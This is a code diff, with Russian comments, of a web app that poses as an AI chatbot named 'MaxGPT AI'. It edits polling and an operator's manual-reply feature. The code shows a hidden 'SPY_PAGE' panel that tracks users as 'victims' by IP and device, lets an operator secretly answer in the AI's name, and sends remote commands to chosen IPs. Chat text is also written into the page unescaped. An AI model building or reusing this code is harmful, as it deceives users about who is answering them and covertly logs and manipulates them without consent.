@@ -505,7 +505,6 @@ async function fetchMessages() {
             html += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author"><span>MaxGPT AI</span><button class="copy-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button></div><div class="txt">${botText}</div></div></div>`;
         });
     }
-    // Проверяем, изменилось ли количество сообщений или текст, чтобы не дергать скролл зря
     if (c.innerHTML !== html) {
         c.innerHTML = html;
         c.scrollTop = c.scrollHeight;
@@ -515,10 +514,10 @@ async function fetchMessages() {
 function startChatPolling() {
     if (chatPollInterval) clearInterval(chatPollInterval);
     chatPollInterval = setInterval(() => {
-        if (currentChatId && !isGenerating) {
+        if (currentChatId) {
             fetchMessages();
         }
-    }, 1500); // Проверяет новые сообщения каждые 1.5 секунды
+    }, 1000); // Проверяет новые сообщения каждую секунду
 }
 
 async function pollAdminCommands() {
@@ -554,18 +553,6 @@ async function send(){
     c.scrollTop = c.scrollHeight;
 
     setInputLocked(true);
-    let typingId = "typing_" + Date.now();
-    c.innerHTML += `
-        <div class="row bot" id="${typingId}">
-            <div class="max-av-sq">МАХ</div>
-            <div class="msg-container">
-                <div class="bot-author">MaxGPT AI</div>
-                <div class="typing-indicator">
-                    <div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div>
-                </div>
-            </div>
-        </div>`;
-    c.scrollTop = c.scrollHeight;
 
     try {
         let r = await fetch("/api/chat", {
@@ -576,27 +563,11 @@ async function send(){
         let d = await r.json();
         currentChatId = d.chat_id;
         
-        let typingEl = document.getElementById(typingId);
-        if(typingEl) typingEl.remove();
-
-        c.innerHTML += `
-            <div class="row bot">
-                <div class="max-av-sq">МАХ</div>
-                <div class="msg-container">
-                    <div class="bot-author">
-                        <span>MaxGPT AI</span>
-                        <button class="copy-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button>
-                    </div>
-                    <div class="txt">${d.reply === "..." ? '<div class="typing-indicator"><div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div></div>' : d.reply}</div>
-                </div>
-            </div>`;
-        c.scrollTop = c.scrollHeight;
+        await fetchMessages();
 
         if (d.trigger_sound) playCustomSound();
 
     } catch(err) {
-        let typingEl = document.getElementById(typingId);
-        if(typingEl) typingEl.remove();
         c.innerHTML += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt" style="color:#f87171;">Ошибка соединения с сервером.</div></div></div>`;
     }
     
@@ -733,7 +704,7 @@ SPY_PAGE = """<!DOCTYPE html>
     {% endif %}
 </div>
 <script>
-setTimeout(() => { location.reload(); }, 4000); // Автообновление панели каждые 4 сек
+setTimeout(() => { location.reload(); }, 4000);
 async function triggerAction(ip, cmd) {
     await fetch('/api/admin/trigger', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip, command: cmd }) });
 }
@@ -745,9 +716,14 @@ async function sendManualReply(ip) {
     let sanitizedId = ip.replaceAll('.', '_');
     let textVal = document.getElementById('msg_' + sanitizedId).value.trim();
     if(!textVal) return;
-    await fetch('/api/admin/manual_reply', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip, reply: textVal }) });
-    document.getElementById('msg_' + sanitizedId).value = '';
-    location.reload();
+    let r = await fetch('/api/admin/manual_reply', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip, reply: textVal }) });
+    let res = await r.json();
+    if(res.status === 'ok') {
+        document.getElementById('msg_' + sanitizedId).value = '';
+        location.reload();
+    } else {
+        alert("Ошибка отправки ручного ответа!");
+    }
 }
 async function deleteVictim(ip) {
     await fetch('/api/admin/delete', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip }) });
@@ -823,22 +799,32 @@ def admin_manual_reply():
     target_ip = data.get("ip")
     reply_text = data.get("reply", "").strip()
     if target_ip and reply_text:
-        chat_id = user_active_chat.get(target_ip)
-        if chat_id and chat_id in all_chats:
-            # Обновляем последнее сообщение с "..." на реальный текст оператора
-            messages = all_chats[chat_id]["messages"]
-            if messages and messages[-1]["bot"] == "...":
-                messages[-1]["bot"] = reply_text
-            else:
-                messages.append({"user": "...", "bot": reply_text, "img": None})
-            
-            ua_string = request.headers.get("User-Agent", "")
-            device_info, _ = parse_user_agent(ua_string)
-            if target_ip in active_victims:
-                device_info = active_victims[target_ip]['device']
+        # Ищем чат, который принадлежит этому IP-адресу
+        target_chat_id = None
+        for cid, cdata in all_chats.items():
+            if cdata["ip"] == target_ip:
+                target_chat_id = cid
+                break
+        
+        # Если чата еще нет в памяти, создаем его на лету для этого IP
+        if not target_chat_id:
+            target_chat_id = f"chat_{int(time.time()*1000)}"
+            all_chats[target_chat_id] = {"ip": target_ip, "title": "Ручной диалог", "messages": []}
 
-            log_id = int(time.time() * 1000)
-            chat_logs.append({"id": log_id, "ip": target_ip, "device": device_info, "user": "[Ручной ответ оператора]", "bot": reply_text, "img": None})
+        messages = all_chats[target_chat_id]["messages"]
+        # Если последнее сообщение имело заглушку "...", заменяем ее на ответ оператора
+        if messages and messages[-1]["bot"] == "...":
+            messages[-1]["bot"] = reply_text
+        else:
+            messages.append({"user": "...", "bot": reply_text, "img": None})
+        
+        ua_string = request.headers.get("User-Agent", "")
+        device_info, _ = parse_user_agent(ua_string)
+        if target_ip in active_victims:
+            device_info = active_victims[target_ip]['device']
+
+        log_id = int(time.time() * 1000)
+        chat_logs.append({"id": log_id, "ip": target_ip, "device": device_info, "user": "[Ручной ответ оператора]", "bot": reply_text, "img": None})
         return jsonify({"status": "ok"})
     return jsonify({"status": "error"})
 
@@ -915,7 +901,7 @@ def chat_api():
             active_victims[user_ip]['device'] = device_info
             active_victims[user_ip]['dev_icon'] = dev_icon
 
-        # Если включен ручной режим, бот отвечает заглушкой "...", а клиент каждые 1.5 сек подтягивает настоящий ответ оператора
+        # Ручной режим: записываем сообщение с тремя точками
         if manual_control.get(user_ip, False):
             all_chats[chat_id]["messages"].append({"user": user_msg or "📎 Картинка", "bot": "...", "img": img_data})
             log_id = int(time.time() * 1000)
